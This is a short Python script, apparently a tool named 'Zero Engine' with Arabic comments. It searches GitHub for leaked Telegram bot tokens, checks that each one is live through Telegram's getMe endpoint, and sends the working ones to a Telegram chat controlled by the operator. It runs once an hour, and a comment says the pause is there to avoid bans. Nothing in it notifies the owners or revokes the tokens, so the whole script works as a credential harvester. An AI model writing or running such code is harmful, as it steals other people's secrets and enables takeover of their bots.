import os
import requests
import time
from scanner import search_for_tokens

GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
BOT_TOKEN = os.getenv('REPORT_BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')

def send_to_telegram(token):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": f"🚨 تم العثور على توكن جديد:\n`{token}`", "parse_mode": "Markdown"}
    requests.post(url, data=payload)

def main():
    print("Zero Engine: Scanner Started...")
    while True:
        tokens = search_for_tokens(GITHUB_TOKEN)
        for token in tokens:
            # التحقق السريع قبل الإرسال
            check_url = f"https://api.telegram.org/bot{token}/getMe"
            if requests.get(check_url).status_code == 200:
                send_to_telegram(token)
        
        time.sleep(3600) # فحص كل ساعة لتجنب الحظر

if __name__ == "__main__":
    main()
